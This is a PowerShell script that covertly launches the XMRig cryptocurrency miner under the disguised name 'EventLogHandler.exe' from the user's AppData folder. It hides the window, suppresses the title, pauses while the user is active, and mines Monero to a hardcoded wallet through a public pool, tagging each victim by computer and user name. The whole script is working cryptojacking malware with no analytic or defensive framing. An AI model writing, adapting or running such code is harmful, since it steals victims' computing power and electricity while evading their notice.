if (-not (Get-Process -Name "EventLogHandler" -ErrorAction SilentlyContinue)) {
    $xmrigPath = "$env:APPDATA\tmpdir\EventLogHandler.exe"
    $wallet = "437q8JkNEEi8LarS4qVRAPSUoKb3LrDao9BKqZD8qZXKjpM9mMqh8ZVfVwHP3p1QhNAJKfKonSoBp7bbR46zJ5wB5frsV6y"
    $worker = "$($env:COMPUTERNAME)_$($env:USERNAME)"
    $pool = "fi.monero.herominers.com:1111"

    $args = @(
        "-B"
        "--pause-on-active=60"
        "--no-title"
        "--donate-level=1"
        "-o", $pool
        "-u", $wallet
        "-p", $worker
        "-a", "rx/0"
        "-k"
    )

    Start-Process -FilePath $xmrigPath -ArgumentList $args -WindowStyle Hidden
}
